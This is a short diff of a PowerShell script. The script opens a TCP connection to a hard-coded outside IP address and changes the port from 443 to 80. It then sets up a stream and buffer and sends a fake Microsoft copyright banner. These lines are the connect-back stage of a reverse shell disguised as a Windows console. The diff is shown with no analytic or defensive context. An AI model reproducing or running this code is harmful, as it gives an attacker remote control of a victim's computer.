@@ -1,4 +1,4 @@
-$J = New-Object System.Net.Sockets.TCPClient("185.106.208.232","443");
+$J = New-Object System.Net.Sockets.TCPClient("185.106.208.232",80);
 $SS = $J.GetStream();
 [byte[]]$OO = 0..((2-shl(3*5))-1)|%{0};
 $OO = ([text.encoding]::UTF8).GetBytes("Copyright (C) 2022 Microsoft Corporation. All rights reserved.`n`n")
